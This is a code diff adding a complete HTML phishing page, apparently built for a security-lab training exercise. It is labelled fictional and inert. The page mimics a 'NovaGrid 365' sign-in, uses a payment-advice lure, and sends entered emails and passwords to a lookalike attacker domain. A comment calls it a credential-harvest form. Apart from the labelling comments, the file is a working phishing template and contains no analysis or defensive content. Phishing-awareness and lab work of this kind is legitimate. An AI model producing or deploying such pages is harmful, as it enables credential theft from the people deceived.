@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<!-- TRAINING ARTIFACT — inert. Fictional. Do not deploy. NovaGrid Security Labs Ep11. -->
+<html lang="en">
+<head><meta charset="utf-8"><title>NovaGrid 365 — Sign in</title></head>
+<body style="font-family:Segoe UI,Arial,sans-serif;background:#f3f2f1;text-align:center">
+  <div style="max-width:360px;margin:80px auto;padding:32px;background:#fff;border:1px solid #ddd">
+    <h2>NovaGrid 365</h2>
+    <p>Your payment advice is protected. Sign in to view the document.</p>
+    <!-- Credential-harvest form posting off to the attacker lookalike domain -->
+    <form action="https://novagrid-m365-login.com/owa/collect.php" method="post">
+      <input name="email" placeholder="Email" style="width:90%;padding:8px;margin:6px"><br>
+      <input name="password" type="password" placeholder="Password" style="width:90%;padding:8px;margin:6px"><br>
+      <button type="submit" style="padding:8px 24px;background:#0067b8;color:#fff;border:0">Sign in</button>
+    </form>
+  </div>
+</body>
+</html>
